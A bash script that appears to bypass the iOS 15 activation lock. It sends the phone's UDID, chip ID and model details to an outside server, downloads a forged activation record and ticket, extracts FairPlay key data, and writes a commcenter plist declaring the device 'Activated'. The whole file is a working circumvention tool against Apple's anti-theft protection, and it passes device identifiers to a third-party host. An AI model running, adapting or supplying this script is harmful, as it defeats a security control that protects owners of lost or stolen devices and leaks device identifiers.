#!/bin/bash

Prnt(){ printf $1; };
Slp(){ sleep $1; };
Replace(){ sed "s/$1/$2/g"; };
Devi(){ ideviceinfo | grep -w $1 | awk '{printf $NF}'; };
PLutil(){ echo -e $1 >>$2; };

printf "making activation_record.plist"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt ".";
curl -s "https://bigb033xecution3r.com/iOS15/iOS15Activ.php?udid=$(Devi UniqueDeviceID)&bv=$(Devi BuildVersion)&dc=$(Devi DeviceClass)&dv=$(Devi DeviceVariant)&mn=$(Devi ModelNumber)&ot=$(Devi OSType)&pt=$(Devi ProductType)&pv=$(Devi ProductVersion)&rmn=$(Devi RegulatoryModelNumber)&ucid=$(Devi UniqueChipID)" --output activation_record.plist
printf "\nmaking IC-Info.sisv"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt ".";
grep -A 40 '<key>FairPlayKeyData</key>' activation_record.plist | grep -B 40 'Cg==' | sed 's/<key>FairPlayKeyData<\/key>//g' | sed 's/<data>//g' | sed 's/<\/data>//g' &>IC
base64 -d -i IC | Replace '-----BEGIN CONTAINER-----' '' | Replace '-----END CONTAINER-----' '' &>IC-Info;
base64 -d -i IC-Info &>IC-Info.sisv; rm IC-Info IC; echo '';
printf "geting for Wildcard.der"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt ".";
curl -s "https://bigb033xecution3r.com/iOS15/$(Devi UniqueDeviceID)/Wildcard.der" --output Wildcard.der; echo '';
Center="com.apple.commcenter.device_specific_nobackup.plist";
printf "making "$Center; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt ".";
rm $Center;
PLutil '<plist version="1.0">\n<dict>' $Center;
PLutil '\t<key>kPostponementTicket</key>\n\t<dict>\n\t\t<key>ActivationState</key>\n\t\t<string>Activated</string>' $Center;
PLutil '\t\t<key>ActivityURL</key>\n\t\t<string>https://albert.apple.com/deviceservices/activity</string>' $Center;
PLutil '\t\t<key>PhoneNumberNotificationURL</key>\n\t\t<string>https://albert.apple.com/deviceservices/phoneHome</string>' $Center;
PLutil '\t\t<key>ActivationTicket</key>\n\t\t<string>'$(cat Wildcard.der)'</string>' $Center;
PLutil '\t</dict>' $Center; 
PLutil '</dict>' $Center; 
PLutil '</plist>' $Center; 
